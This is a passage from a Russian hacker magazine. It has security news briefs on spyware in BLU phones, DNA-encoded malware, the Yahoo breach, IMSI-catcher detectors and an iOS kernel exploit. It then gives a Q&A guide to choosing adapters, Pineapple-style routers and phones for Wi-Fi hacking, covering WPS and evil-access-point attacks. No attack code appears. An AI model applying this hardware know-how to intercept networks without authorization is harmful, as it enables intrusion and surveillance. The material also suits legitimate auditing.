     Представите ли Adups отрицали, что FOTA — шпионское ПО, и заявляли,
   что система собира ла данные по ошиб ке. Раз работчики пообещали позабо‐
   титься о том, что бы подоб ное не повторилось в новых версиях прошивок,
  а помочь в этом им дол жны были спе циалис ты BLU и Google.
    Однако в начале августа 2017 года аналитики Kryptowire выс тупили на кон‐
  ферен ции Black Hat, где сооб щили, что смар тфоны BLU по‐прежнему пос‐
   тавляются в магази ны с предус танов ленной спайварью.
     Представите ли BLU вновь стали отри цать все обвинения специалистов.
  В компании завери ли,  что шпионское ПО было удалено с устройств
  еще в 2016 году и теперь все гаджеты «чис ты», а если какие‐то данные
  и передаются в Китай, то это обык новен ная телеметрия и диагности ческая
  информация, какую собира ют и другие производите ли смартфо нов.
    Но заяв лени ям BLU не поверили не только спе циалис ты Kryptowire, но и
   сотрудни ки ком пании Amazon. Интернет‐магазин сообщил, что бюджетные
  устройства китайского про изводителя отныне запрещены к продаже на Ama‐
   zon. В будущем запрет могут снять, если BLU устранит най денные специалис‐
  тами проб лемы, но пока пред ставители Amazon не хотят под вергать поль‐
  зователей риску и распростра нять зараженные спайварью устрой ства.





  →«Всю жизнь я раз мышляю над вопросами „компьютер vs человек“, так что все аспекты раз‐
   работки ИИ кажутся мне захватывающими. Но как прагматик я чувствую, что мы не осо бенно
   приб лижаемся к созданию нас тоящего ИИ, во многих случаях это скорее Дополненная Идиотия
   (Augmented Idiocy). То, что называется ИИ, не похоже на человечес кий мозг, так что даже сам
   термин вводит в заблуждение. Машины спо соб ны хорошо выполнять свои задачи. Они выиг‐
   рали эту вой ну с людьми еще двести лет назад в Ман честере, когда машины ста ли делать
   дешевую одеж ду. Сегод ня мы можем писать и произносить слова, которые, казалось бы,
   понят ны машинам, и они учатся выполнять умствен ные задачи, к при меру спо собны играть
   в игры луч ше, чем человечес кий мозг. Но это лишь работа ПО, написанного людьми для дос‐
   тижения целей, заложенных в него программис тами. Никто не ждет, что машина сядет
   и подумает: „Чем бы мне занять ся сегод ня?“ Это лежало бы за предела ми син гулярности.
   Мозг — это гораздо боль ше, чем прос то определенный объем информации, обработан ной
   за определенный период вре мени. О его структуре до сих пор мож но лишь строить догадки»,
  — Стив Воз няк об искусс твенном интеллекте в нас тоящее время.





 МАЛВАРЬ В ДНК
  Мал варь, закоди рованная в ДНК, хакеры, проника ющие в сети корпораций
  через образец слюны или кро ви и похища ющие секреты, люди, чья ДНК
  защище на от анализа вредонос ным кодом? Звучит как научная фантасти ка,
   но, похоже, с подобными явлениями специалис ты по информационной
  безопасности и биоинформатике столкнутся уже в обоз римом будущем.
     Груп па ученых из Вашин гтонско го университета под руководством Тада‐
  ёши Коно (Tadayoshi Kohno) предста вила интересный доклад на конференции
  USENIX Security, про шедшей в Канаде 16–18 августа 2017 года. Иссле дова‐
   тели сумели поместить в цепочку ДНК работающую малварь, которая способ‐
  на атаковать ДНК‐секвенсор через переполнение буфера (buﬀer overﬂow).
  С результатами изыс каний специалистов уже мож но озна комиться на офи‐
  циальном сайте университета, где также был опубликован пос вященный
  проблеме де тальный доклад (PDF).
    Спе циалисты рассказывают, что, хотя от реальных «атак через ДНК» нас
  пока отделяют годы, уже сей час воз можно соз дать работающий proof‐of‐con‐
   cept эксплоит и опробовать его в работе. Коно говорит, что в нас тоящее вре‐
  мя софт для такого оборудо вания, как ДНК‐секвенсоры, пишут без оглядки
  на вопросы безопасности, но скоро специалистам при дется думать не только
  о под клю чении к сети, USB‐накопителях и человечес ком фак торе, но и о дан‐
   ных, хранящихся в самих изу чаемых образцах ДНК, то есть появит ся совер‐
  шенно новый тип угроз.





  Как оказалось, соз дать биоло гичес кую малварь, которая сохранит стабиль‐
   ность и работоспособ ность после помещения в ДНК, — задача не из легких.
   Хотя спе циалисты нацеливались на простую атаку на перепол нение буфера,
  даже с этим возникли проб лемы. В ито ге в док ладе команда приз нается, что
  для воплощения идеи в жизнь им пришлось немного сжульничать.
    Дело в том, что, как правило, данные ДНК‐сек венирования хранят ся
   в формате FASTQ, для работы с которым используется специаль ное ПО,
   к при меру опенсор сное решение fqzcomp.
     Нес мотря на то что подоб ное ПО часто содержит баги (изу чив 13 популяр‐
  ных  программ,  удалось обнаружить  реальные  уязвимос ти  практически
  во всех), иссле дователи были вынуждены умыш ленно привнести в код fqz‐
  comp собственную уязвимость, которая соз давала иде альные усло вия, спе‐
  циально для  атаки на переполнение буфера. Для этого было добав‐
  лено 54 стро ки кода на C++, а еще 127 строк были удалены.
    Биоло гическую малварь помес тили в ДНК, воспользовавшись тем, что
  во вре мя секвенирования ДНК ее раз бира ют на составля ющие (аденин [A],
   гуанин [G], цитозин [C] и тимин [T]), а оборудо вание преобразует полученные
  данные в дво ичные единицы информа ции (A = 00, C = 01, G = 10, T = 11). Прав‐
   да, и здесь не обош лось без проблем. К при меру, Коно отме чает, что сек‐
  вениро вание ДНК может про исхо дить в любом направле нии, тогда как код
  может читаться только в одном. Из‐за подоб ных нюансов атака исследова‐
  телей сра батывала успешно лишь в 37% случаев, и они предполагают, что
   в будущем такие экспло иты будут умыш ленно соз даваться как «палиндромы».


 → 3 000 000 000 акка унтов Yahoo пос традали в резуль тате взлома. Компания Yahoo обна‐
   родовала новые детали взлома, о котором впервые ста ло извес тно в кон це 2016 года. Тогда
   сооб щалось, что ата ка произошла еще в 2013 году и неиз вес тные злоумыш ленники сумели
   получить дос туп к информации более чем о миллиарде пользователей. При этом Министерство
   юстиции США и Yahoo обви нили в хищении данных «русских хакеров». Теперь была опуб‐
   ликова на новая информация: сторонние экспер ты, которых привлекли к расследованию инци‐
   дента, пришли к выводу, что в ходе утечки пострадали три миллиарда человек, то есть вся
   поль зовательская база Yahoo. В распоряжении прес тупников мог ли ока заться име на, даты рож‐
   дения, email‐адреса, номера телефонов и пароли поль зователей.





 ЗАЩИТЫ ОТ IMSI‐
 ПЕРЕХВАТЧИКОВ НЕТ
   IMSI‐перехватчи ки широко применя ются как спецслужбами, так и «плохими
  парнями». Они исполь зуют конструктивную осо бенность мобильников —
  отдавать предпочте ние той сотовой выш ке, чей сигнал наиболее сильный
   (чтобы максимально повысить качес тво сиг нала и минимизировать собствен‐
  ное энер гопотребле ние). Кроме того, в сетях GSM (2G) только мобильник
  должен про ходить процедуру аутентифика ции  (от сотовой вышки это го
  не требуется), и поэтому его лег ко ввести в заб луждение, в том чис ле что бы
  отклю чить на нем шифрование дан ных.
     Нес мотря на немалое количес тво «защитных» Android‐приложений на рын‐
   ке, которые должны предупреждать пользователя о подключении к IMSI‐кет‐
   черу, боль шинство из них нельзя наз вать качественными. Кроме того, такие
  при ложе ния часто приводят к множес тву ложных срабаты ваний (как правило,
   из‐за недос таточ ной технической квалификации их разработчиков).
    Приложе ния для защиты от IMSI‐перехватчиков изучила сводная группа
  спе циалистов из Оксфорд ского универ ситета и Берлинского тех нического
  уни вер ситета. Иссле дователи провери ли работу пяти популяр ных программ:
   SnoopSnitch, Cell Spy Catcher, GSM Spy Finder, Darshak и IMSICD, которые
  нас читывают от 100 тысяч до 500 тысяч загрузок в Google Play.
     Для тестов специалисты создали собственный фрей мворк White‐Stingray,
  спо собный проводить ата ки на 2G‐ и 3G‐сети. По сути, раз работка иссле‐
  дователей представ ляет собой весь ма «натура листичную» имитацию ком‐
  мерческих IMSI‐перехватчиков.
     Тестирование приложений показало, что те край не редко замечают подоз‐
  рительную активность и способ ны обна ружить лишь самые распространен‐
  ные и прос тые техники атак. К примеру, приложения фиксируют принудитель‐
  ный даунгрейд под ключения или получе ние «скрытого» тексто вого сооб‐
  щения, которое используется для опре деления мес тоположения устрой ства.
  Но спе циалисты пишут, что ата кующим дос таточ но переключиться на другую
   тех нику атак и приложе ния окажутся практичес ки бессильны. Причем мешают
  при ложе ниям ограничения самого API Android, с которы ми мало что можно
   поделать.



        «Сейчас пред став ленные на рынке приложе ния ICD [IMSI catcher de-
           tector] легко обма нуть, используя прос тейшие техники обхода, так
          как они сильно огра ниче ны и не име ют дос тупа к лежащему в основе
        мобильных  телефонов  аппа ратному  обес печению. Сле дова тельно,
        нужно понимать, что ICD-приложе ния — это не серебряная пуля в силу
        данных фундаментальных огра ниче ний», — пишут спе циалис ты.


 ПОПУЛЯРНОСТЬ МАЛВАРИ ДЛЯ МАЙНИНГА РАСТЕТ
   Курсы криптовалют продолжают рас ти и выглядят все заман чивее даже для весь ма далеких
   от IT‐среды граждан, к тому же блокчейн, ICO и майнинг обсуждают уже повсеместно, а не
   только на стра ницах профильных форумов и изданий. Спе циалисты «Лаборатории Касперско‐
   го» сообщают, что интерес прес тупников к этой области тоже демонстрирует законо мерный
   рост.

  →Если в 2013 году майнинговая мал варь представ ляла угрозу лишь для 205 000 пользовате‐
   лей, уже в 2014 году этот показатель увеличился до 701 000, а в 2016 году и вов се превысил
    1 650 000 мил лиона человек.





  →По самым скром ным оценкам исследователей, майнин говая сеть на 5 000 машин в сред‐
   нем приносит своим вла дельцам до 30 000 долларов в месяц. Изучив криптовалютный
   кошелек такого ботнета, специалисты обнаружили 2289 Monero (XMR), то есть более 210 000
   дол ларов США. При условии, что обычный ста ционарный компьютер выдает мощность 30–100
   хешей в секунду, можно подсчитать, что ботнет насчитывает приб лизительно 4 000 машин.





 ЭКСПЛОИТ ДЛЯ IOS
  Эксперт ком пании Zimperium Адам Доненфелд (Adam Donenfeld) обнародо‐
  вал proof‐of‐concept для решения ziVA — это эксплоит для уяз вимостей в ядре
   iOS, работа ющий на вер сии 10.3.1 и ниже.  ziVA поз воля ет атакующим
   получить root‐дос туп с возможностью чтения и записи (RW, Read‐Write).
     Все восемь уязвимостей, лежащие в сердце эксплоита, были исправ лены
  инже нера ми ком пании Apple в мае 2017 года. Один баг был обна ружен в IO‐
   Surface, а другие семь в AppleAVE Driver. И хотя патч был выпущен еще вес‐
   ной, учитывая серь езность проблемы, Донен фелд принял решение отложить
  пуб ликацию экспло ита, тем самым давая поль зовате лям боль ше времени
  на обновле ние своих устрой ств.
    Иссле дователь говорит, что обнаружил проб лемы, изу чая те области ядра,
  которые редко становят ся объектом вни мания специалистов. По его словам,
  при написании AppleAVE раз работчики пре неб регли даже базовыми правила‐
  ми безопасности, что в ито ге и позволило специалисту использовать эти уяз‐
  вимос ти для соз дания экспло ита для ядра.
      Proof‐of‐concept ziVA уже можно найти на GitHub. Кроме того, Доненфелд
  выступил на конференции Hack In The Box в Сингапуре, где под робно рас ска‐
  зал о сво их находках и возможных последстви ях их эксплуата ции.





                     Уязвимости, вошедшие в состав ziVA


 → 1 из 50 при ложений для iOS может «сливать» дан ные. Специалисты компании Zimperium
   предуп редили, что экосис тема iOS далеко не так безопасна, как принято считать. Во вто ром
   квартале 2017 года ана литики Zimperium обнаружили, что число уязвимос тей в iOS и Android
   увеличи лось  на  порядок.  К  при меру,  в  2014  году  идентификаторы  CVE  получили
   менее 200 багов, тогда как в 2016 году их нас читывалось более 600, а 2017 год уже превзошел
   предыду щий по дан ному показа телю. Также уда лось под считать, что 23% iOS‐устройств и 94%
   Android‐устрой ств исполь зуют устаревшее ПО. Хуже того, ска нирование 50 тысяч iOS‐приложе‐
   ний на корпоратив ных устройствах показало, что на каждом пятом из них есть как минимум
   одно при ложение, спо соб ное похитить UDID или пароли.
  COVERSTORY


  СОБИРАЕМ ТУЛКИТ ДЛЯ ВЗЛОМА
  WI‐FI:USB‐АДАПТЕРЫ, «АНАНАСНЫЕ»
  РОУТЕРЫ, АНТЕННЫ И ДРУГИЕ
  ИНСТРУМЕНТЫ ХАКЕРА





     Олег Купреев
 Wi‐Fi‐хакер, независимый
ресерчер, участник DC7499





  Вардрайвинг, он же перех ват трафика Wi‐Fi, всегда начина‐
  ется с выбора обо рудования. Именно этим мы и зай мем ся:
  в удобном фор мате вопросов и ответов раз берем, какие
  девайсы существуют в природе, для каких задач они под‐
  ходят луч ше всего и что взять для начала.


  ПОЧЕМУ ВАРДРАЙВИНГ — ЭТО КРУТО?
  На сай те iPass есть интерес ная ста тис тика роста числа хотспотов Wi‐Fi
   во всем мире. Толь ко взгляни на нее: с 2013 года при рост почти на 900%.
  При мерно ту же кар тину можно наблюдать на сай те WiGLE, который собира ет
  информацию о публичных точках доступа.
     То есть Wi‐Fi теперь везде и всюду; в более‐менее круп ных городах диапа‐
   зон 2,4 ГГц забит по полной. Москва, кстати, недавно заняла второе место
   в мире по распространению  Wi‐Fi в общес твенных местах,  что меня,
   как жителя сто лицы и любителя Wi‐Fi‐хакин га, радует невероятно. О том,
   какую роль играют SSID сетей MosMetro_Free и MT_FREE, я еще как‐нибудь
   рас скажу.
     Тем временем  Wi‐Fi  Alliance обе щает,  что  все  только  начинается.
  К 2020 году мы увидим 38,5 миллиарда подклю чен ных устройств, постепенно
   в жизнь вой дут новые стандарты, рассчитанные на низкое энергопотребле‐
   ние и IoT; возможно, во что‐то выль ется перекрестное опыление с LTE в рам‐
   ках LTE‐U и так далее и тому подобное.
    В общем, ты уже понял: специалист, который рубит в безопас ности всего
   этого добра, без куска хлеба не оста нет ся. :‐)




                         Согласно пункту 4.1.1 стан дарта PCI DSS  v. 2,
                           требуется регулярно проводить аудит безопас‐
                           ности точек доступа Wi‐Fi. Корректно это мож но
                          сделать только теми же инструментами, какие
                          используются в реаль ных атаках. Статья носит
                       информа ционный харак тер. Она адресована спе‐
                         циалистам по ИБ и тем, кто собирается ими
                               стать.



  КАКИЕ БЫВАЮТ СТАНДАРТЫ WI-FI?
  Возможно, тебя это удивит, но Wi‐Fi может работать не только в час тотных
   диапазонах 2,4 и 5 ГГц. За цифрами 802.11 скры вается целый набор стан‐
   дартов для общения устройств в беспроводной локальной сети. Несущие
   частоты бывают самые раз ные. Вот их список:
    • 900 МГц — 802.11ah;
    • 2,4 ГГц — 802.11b, 802.11g, 802.11n, 802.11ax;
    • 3,6 ГГц — 802.11y;
    • 4,9 ГГц — 802.11j;
    • 5 ГГц — 802.11a, 802.11n, 802.11ac, 802.11ax;
    • 5,9 ГГц — 802.11p;
    • 45 ГГц — 802.11aj;
    • 60 ГГц — 802.11aj, 802.11ay.

   Ес ли хочешь еще подтянуть мат часть, то обязатель но полистай страницу
   про IEEE 802.11 в «Википедии», а если этого покажется мало, то перехо ди
   к первоисточни кам и начинай лопатить са ми стандарты.


  РАБОТА С РАДИОЧАСТОТАМИ ЗАКОНОДАТЕЛЬНО РЕГУЛИРУЕТСЯ,
  ВЕРНО?
  Без лицензии можно работать далеко не на любой частоте. Такие нелицен‐
   зируемые диапазоны получили название ISM (Industrial, Scientiﬁc, Medical).
   Сет ку частот и мощ ность передатчиков для таких диапа зонов регули руют
   соот ветствующие органы. Без лицензии мож но работать толь ко с уче том
  местных ограниче ний.
    В Рос сии эти ми вопросами занимается Роскомнадзор, ныне хорошо
   известный каждому. Но если в интернете Рос комнад зор знаменит благодаря
   блокировкам, то в области беспроводных сетей он, наоборот, продолжает
   раз решать и разрешать.
    В 2014 году в Рос сии было снято ограничение на использование полос
   радиочастот 2400–2483,5 МГц для устройств малого радиуса дей ствия.
  В 2015 году был легализован 802.11ac и за компанию — 802.11ad.


  НА КАКИХ ЧАСТОТАХ МОЖНО РАБОТАТЬ БЕЗ ОГРАНИЧЕНИЙ?
  Без  разрешения  Рос комнадзора  возможно  использование  сле дующих
   диапазонов ради очастот, беспомеховая работа РЭС в которых не обес‐
   печена: 2400–2483,5 МГц для РЭС с максимальной мощ ностью передат‐
   чика 0,1 Вт (каналы 1–13), 5150–5350 МГц для РЭС с максимальной мощ‐
   ностью передатчика 0,2 Вт и только для при мене ния в зак рытых помеще‐
   ниях — каналы 36–64, диапазоны UNII‐1 и UNII‐2.
     Ди апазон же 5650–5825 МГц (каналы 132–161) пока по‐прежнему открыт
   для воздушных судов, находящихся в полете на высоте не ниже 3000 м. Как ты
  понимаешь, в неразрешенных частях спектра может оби тать раз ного рода
  обо рудование. Например, радары или релейки. Так что остается ждать улуч‐
   шений.
     Кроме этого, для диапазонов 5150–5350 МГц и 5650–5850 МГц была
   удво ена максимально допустимая мощность (до 10 мВт) на 1 МГц.




                       Ис пользование  Wi‐Fi‐адап теров  с мощностью
                           излучения передатчика более 100 мВт требует
                           регис трации    в    соответствии    с    пун‐
                          ктом  2   статьи  22  Федераль ного   закона
                            от 07.07.2003 № 126‐ФЗ «О связи» и Постанов‐
                          лением          Пра вительства        РФ
                            от 12 октября 2004 года № 539 (с изм.).



  КАКИЕ УСТРОЙСТВА ПРИГОДНЫ ДЛЯ ВАРДРАЙВИНГА?
   Глав ный выбор, который тебе пред стоит сделать, — это даже не конкретная
  модель устройства, а его тип. Существу ют USB‐адаптеры (они же «донглы»
   и «свистки», а на жар гоне их иног да называют «карточками»), Wi‐Fi‐роутеры,
   а также микрокон троллеры с поддержкой Wi‐Fi. Ты можешь использовать
   телефон или планшет, но и тут гораздо лучших результатов можно добить ся
   в связке с внешним адаптером.


  ПОЧЕМУ МНОГИЕ ОБХОДЯТСЯ USB-АДАПТЕРОМ («СВИСТКОМ»)?
  Это удоб но, привыч но и обычно дешев ле, чем роутер. Есть немалый выбор
  хорошо зарекомендовавших себя адаптеров с режимом мониторинга (имен‐
   но он понадобится тебе для проведения атак). В общем, всем начинающим
   я бы посове товал брать «свисток» — он в любом случае еще не раз пригодит‐
   ся.


  НЕЛЬЗЯ ЛИ ЛОМАТЬ WI-FI С ПОМОЩЬЮ АДАПТЕРА,
  ВСТРОЕННОГО В НОУТБУК?
  Вынуж ден тебя огорчить: чипы, которые ста вят в ноутбуки, обычно нельзя
   переключить в режим мониторинга, так что и говорить тут не о чем. И даже
   если бы это было возможно, дальность приема встроенной антенны в ноут‐
   буке обыч но невелика, а внеш нюю подключать некуда.


  С ЧЕГО НАЧАТЬ ВЫБОР АДАПТЕРА?
  Су ществует великое множество вариантов, но далеко не все из них пригод ны
   для хакинга. Советую для начала заглянуть на WikiDevi и пос мотреть спи сок
   рекомендуемых адап теров. Также немало информа ции ты можешь найти
   на сай те WirelesSHack в разделе Wi‐Fi and Wireless. Главное, на что нужно
   смот реть при выборе, — это под держка режима мониторинга и возможность
   под клю чить внешнюю антенну, потому что без нее о какой‐то дальности
   говорить не при ходится. И конечно, лучше все го брать адаптер с хорошо
   зарекомендовав шим себя чипом.


  КАКИЕ ЕСТЬ ИЗВЕСТНЫЕ ПРОИЗВОДИТЕЛИ ЧИПОВ WI-FI?
  Основные про изводители чипов — Qualcomm Atheros, Broadcom, Realtek
   и MediaTek (в прошлом Ralink). Если сравнивать производителей, то Atheros
   считается иде альным решени ем для хакинга. К при меру, компания Ubiquiti
   использует в основном чипы Atheros для соз дания устройств профессиональ‐
   ного уров ня. Большая часть рекордов дальнос ти Wi‐Fi была поставле на
   с использовани ем оборудования Ubiquiti.





  КАКОЙ АДАПТЕР ЛУЧШЕ ВСЕГО БРАТЬ?
  Каж дый волен выбирать, что ему нравится, но новичкам я в последнее время
   рекомендую исклю чительно TP‐Link WN722N. На то есть целый ряд при чин:
  дешевизна, доступность (можно найти в большинстве компьютерных магази‐
   нов), поддер жка необходимых режимов, поддержка mac80211 (стандарт
   де‐факто для драй веров адаптеров Wi‐Fi). Для WN722N есть исходные коды
   про шив ки и опенсорсные драй веры, что очень пригодится для внесения сво‐
   их модификаций. Так же отмечу стабильность и скромные запросы к питанию
   (0,5 A на максимуме). Это делает воз можным подключение к мобильным
   устройствам через кабель OTG — в Kali NetHunter эта карта поддерживается.
  С TP‐Link WN722N возможно сканиро вать спектр, а также проводить некото‐
  рые прод винутые ата ки на 802.11. В общем, все, что только может понадо‐
   биться.





                                 TP‐Link WN722N




  Пос ле пуб ликации статьи читатель под ником InﬁniteSuns прис лал допол‐
   нение: у адап теров 722N с недавних пор появи лась вторая ревизия железа
   на кристалле RTL8188EUS.
     Та ким образом, сказанное про Atheros справед ливо только по отно шению
   к 722N ревизии 1.Х. Для наших целей искать следует именно такие адаптеры.



  А КАК ЖЕ ЛЕГЕНДАРНАЯ «АЛЬФА»?
  Многие начинающие вар драйверы стараются купить так называемую «Аль‐
   фу», то есть один из адаптеров Alfa Networks. Но этот производитель выпус‐
   кает массу устройств на самых разных чип сетах, так что «та самая» Alfa может
   быть очень разной. Для меня, как и для мно гих, это Alfa AWUS036H. В свое
   вре мя это была самая желанная «кар точка», так как у нее есть собс твенный
   усилитель. Осталь ные устройства Alfa тоже отлично спроектированы и соб‐
   раны, но я бы не сказал, что уни кальны.
      Увы, лучшие дни Alfa AWUS036H уже позади. В ее основе — чипсет Realtek
   8187L, которому неведом стандарт 802.11n, как и режим точ ки дос тупа.
  При ата ках на WPS со слабым уровнем сигнала Alfa AWUS036H по‐прежнему
   вне кон куренции, но во всех других случаях ничего особенного в ней нет. Да и
   к мобильному телефону ее, увы, не подключишь — усилитель тре бует слиш‐
  ком мно го энергии.
     Существуют адап теры Alfa с маркировкой Long‐Range. Усилителя в них
   нет, но зато туда ста вят хорошие фильтры и чип TeraLink, к которому уже есть
   «правильные» дрова. Так что можешь рассмотреть как вари ант.





                                        Alfa AWUS036H


  НУЖЕН ЛИ КАКОЙ-ТО СПЕЦИАЛЬНЫЙ КАБЕЛЬ?
  Прежде чем подклю чать адаптер к компь юте ру, сле дует обеспечить надеж ное
   питание, что бы избежать сбо ев. Это важно для всех ВЧ‐устройств, а если
   у тебя Alfa AWUS036H, то стоит помнить про ее повышенное энергопотребле‐
   ние. Не все кабели USB оди нако во полез ны, и от качества может зависеть
   сила тока (кос венным показа телем качес тва может быть толщина). Так что,
   при обре тя хорошую «карточку», лучше не подсоеди няй ее чем попало.


  НУЖНО ЛИ ИСКАТЬ АДАПТЕР С USB 3.0, ИЛИ ХВАТИТ USB 2.0?
   Большинство адап теров снаб жены интерфейсом USB 2.0, потому что USB
   3.0 вносит значительные огра ничения. Серьезные производители чипов (тот
  же Atheros) под держи вают диапа зон 5 ГГц только на картах с PCI‐E — именно
   их я и рекомендую брать для работы с 5 ГГц. А для остального подойдет
   и USB 2.0.


  МОЖНО ЛИ НАЙТИ ПРИЛИЧНЫЙ АДАПТЕР НА ALIEXPRESS?
  На китай ских развалах полно разных адаптеров, в том числе клонов извес‐
   тных марок вроде Alfa. Но, выбирая из них, нужно быть очень осторожным:
   при веденные харак теристики зачас тую не соответству ют действитель ности
   и даже чип может быть уста нов лен не той модифи кации, что указан в опи‐
   сании. Автор «Хакера» подробно рассмотрел несколь ко таких вари антов
   в статье «Вы бираем бюджетный адаптер для взло ма Wi‐Fi». Как результат —
   удалось най ти неплохую внешнюю антенну в ком плек те с далеко не самой
   выдающейся «кар точкой» (речь о Netsys 9000WN), а также несколько экс тре‐
   мально дешевых адап теров. В общем, если жаж дешь приключений и эко‐
  номии — ищи, и, воз можно, попадется что‐нибудь инте ресное. Не забудь
   поделиться в ком ментариях своей находкой!


  В КАКИХ СЛУЧАЯХ СТОИТ БРАТЬ РОУТЕР, А НЕ USB-АДАПТЕР?
  При использовании «свистка» прог рамма должна работать на компьютере,
   а это не всегда удобно. Та же самая атака на WPS может растянуться
   на восемь часов, и в улич ных усло виях, да еще и в нашем суровом климате,
   занимать ся вардрайвингом с ноутбуком напере вес — то еще раз вле чение.
     Ло гично было бы вынести эту работу на отдельное устройство, и роутер —
   как раз такое самодос таточное устройство. Нужно только подоб рать под‐
  ходящий и снабдить его специальной прошивкой. Обычно хакерские про шив‐
   ки собира ют на осно ве OpenWrt и добавляют туда необходимый софт: Air‐
   crack‐ng, Reaver, PixieWPS и дру гие утилиты. Готовое же решение пока что
   все го одно — это всем извес тный «Ананас», он же WiFi Pineapple.
     К тому же есть класс атак, которые невозможно проводить, используя
  USB‐адап тер. Нап ример, есть такая атака Karma, которая потом стала извес‐
   тна как Mana. Это «злая» точка дос тупа. Если ты попыта ешься вос произвести
   ее со «свистком» (к при меру, тем же TP‐Link WN722N), то столкнешься с огра‐
   ниче нием в семь клиентов, которое жестко прописано в прошивке. Нас‐
   тоящая же причина в том, что у адап тера недос таточно внутренней памяти.


  ЧТО СОБОЙ ПРЕДСТАВЛЯЕТ ЭТОТ «АНАНАСНЫЙ» РОУТЕР?
   WiFi Pineapple начинался как проект кастомной прошив ки для роутера фирмы
    Alfa и тогда носил название Jasager. Под руководством команды из Hak5 про‐
   ект за годы дорос до отдельного и весьма специфичного устрой ства, которое
   позволя ет не только перехватывать Wi‐Fi, но и про водить последу ющие ата ки
  MiTM в сети. Поставляется он в двух вариантах: в виде отдель ного устройства
   WiFi Pineapple TETRA или же в формате USB WiFi Pineapple NANO.





                            Pineapple NANO и TETRA


  ПОЧЕМУ БЫ ТОГДА НЕ ПРИКУПИТЬ ЭТОТ PINEAPPLE?
   «Ананас» — это, безусловно, интересное устрой ство, которое заслуживает
   отдельной статьи. У него удоб ный и красивый веб‐интерфейс и все готово
   для потребителя. Но он недешев (NANO сто ит 99, TETRA — 199 дол ларов),
   и его невозможно заказать из России нап рямую.


                                         Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

        СОБИРАЕМ ТУЛКИТ ДЛЯ ВЗЛОМА
                     WI‐FI:USB‐АДАПТЕРЫ,
        «АНАНАСНЫЕ» РОУТЕРЫ, АНТЕННЫ
        И ДРУГИЕ ИНСТРУМЕНТЫ ХАКЕРА





НА КАКИЕ ЕЩЕ РОУТЕРЫ СТОИТ ОБРАТИТЬ ВНИМАНИЕ?
Роутеры бывают на любой вкус и цвет, а о поддержке OpenWrt ты можешь
узнать на сайте это го проекта. Из стационарных можно порекомендовать,
нап ример, TP‐Link TL‐WDR4300 на чипе Atheros, он поз воля ет одновре менно
работать с диапазонами 2,4 и 5 ГГц. Но на полевые работы его с собой
не возьмешь.
  Мне в последнее вре мя приг лянулись решения гонконгской фирмы GL.iN‐
et  на  основе SoM  Domino  Core.  GL.iNet  пред лагает  полный  спектр
решений — от голых плат и компонентов до собранных роутеров. Себе я взял
GL‐MiFi за 99 дол ларов. Он отличает ся следующими дос тоинствами:
 • есть внутренний акку мулятор (в отли чие от «Ана наса»);
 • при заказе мож но добавить 4G‐модем Quectel EC‐25, который хакабе лен
   и сам по себе;
 • возможно подключить внеш ние антенны через разъ емы UFL на плате;
 • мож но при желании исполь зовать как акку муля тор для зарядки мобиль‐
   ного телефо на;
 • по мер кам китай ских вен доров GL.iNet край не адекватен, даже делает
   свои прошивки для работы через Tor.

Продукцию GL.iNet уже оценило хакерское сооб щество, и для нее стали появ‐
ляться про шивки с самодельным «Ананасом». Похвалюсь и сам: я собрал
еди ный репози торий с разного рода поделками «Ананаса», который может
при годить ся любителям DIY.





                         GL‐MiFi спереди и сза ди


КАКИЕ РОУТЕРЫ БРАТЬ НЕ СТОИТ (ИЛИ СТОИТ, НО С
ОСТОРОЖНОСТЬЮ)?
Хоть выбор роутеров и велик, но для хакин га сгодится не любой. Мое пред‐
почтение, как и в случае с адаптерами, на стороне железа с чипами Atheros.
Это в том числе все та же продукция TP‐Link, которая давно и успешно при‐
меня ется хакерами. Модели TL‐WR703N, TL‐MR3020, TL‐MR3040 еще не так
давно повсеместно использовались для создания  хакерских прошивок
и модов.
  Именно на их основе любители собира ли свои «пиратские» вер сии и «Ана‐
наса» с поддер жкой ата ки Karma. Наличие порта USB поз воля ет воткнуть
как 3G/4G‐модем, так и обычную флеш ку с приличным набором софта, а воз‐
можность запустить Python + Scapy придет ся по нраву мно гим любителям
сетевого веселья.
  Однако скромный размер ПЗУ и ОЗУ в этих моделях стал серьезной прег‐
радой для соз дания более интересных про шивок. Так что если ты не готов
к моддингу, то покупать их сегод ня я бы не рекомендовал.


МОЖНО ЛИ «ПРОКАЧАТЬ» УЖЕ КУПЛЕННЫЙ РОУТЕР?
Малый размер ПЗУ и ОЗУ — это еще не приговор для устройства, их можно
выпаять и заменить относительно дешево. Сами чипы стоят копейки. В качес‐
тве  ROM‐чипа  возьму  на  себя  смелость  пореко мендовать  Winbond
W25Q128FV с 16 Мбайт флеш‐памяти.
  С RAM все еще забавнее: воз можно, тебе вовсе не понадобит ся ничего
покупать. Опе ративку можно успешно позаимс тво вать со старых плашек
памяти стандарта DDR1 (ты ведь их сохранил, выкидывая старый системник,
верно?). Если же в ящи ке твоего сто ла нет коллекции старинных комплек‐
тующих, а дедуш ка свой компь ютер разбирать не разрешил, это тоже
не беда. Предпри имчивые китайцы продают готовые киты для замены — ищи
RAM в кор пусах TSOP‐II на 66 ножек.
  Преж де чем расширять память, следует перепрошить роутер. Потому что
родные про шив ки большинс тва роутеров частень ко содержат захардкожен‐
ные адреса, которые не будут соб людены при большем количестве оператив‐
ной памяти.
   Если ты уже запорол роутер, то тебя спасет U‐Boot. В случае с роутерами
TP‐Link нужно только шеп нуть заветные бук вы tpl в UART при загрузке,
и девайс выдаст тебе доступ к U‐Boot вместо того, чтобы продолжать грузить
крашаще еся ядро.


ЧТО НУЖНО ДЛЯ ВЗЛОМА WI-FI С МОБИЛЬНОГО ТЕЛЕФОНА?
Когда у тебя нет возможности развернуть ся с антеннами и ноутбуком, оста‐
ется запас ной вариант — исполь зовать для пентестов мобильный телефон.
Под робно про цесс разобран в статье «Взлом Wi‐Fi со смартфо на». Если
вкратце, то тебе понадо бится дистрибутив Kali NetHunter, один из совмести‐
мых телефо нов с поддержи ваемой прошивкой и, конечно, внешний USB‐
адаптер, подключаемый через кабель OTG.
  В качестве дон гла можешь взять уже упомяну тый TP‐Link WN722N — из
всех популярных только у него энергопотребление достаточно низ кое, чтобы
можно было под клю чать даже к маломощ ным устрой ствам. Более дорогие
и навороченные «Альфы» тоже вполне реально прис пособить к телефону,
но не все и не к любому. Мощная «карточка» может не заработать или начать
под чистую высасывать аккумулятор телефо на. В результате народ уже стал
изобретать схе мы с внешними батарей ками и даже солнечны ми зарядками.





                                      Kali NetHunter


ПРИГОДЕН ЛИ ДЛЯ ВАРДРАЙВИНГА ЧИП ESP8266?
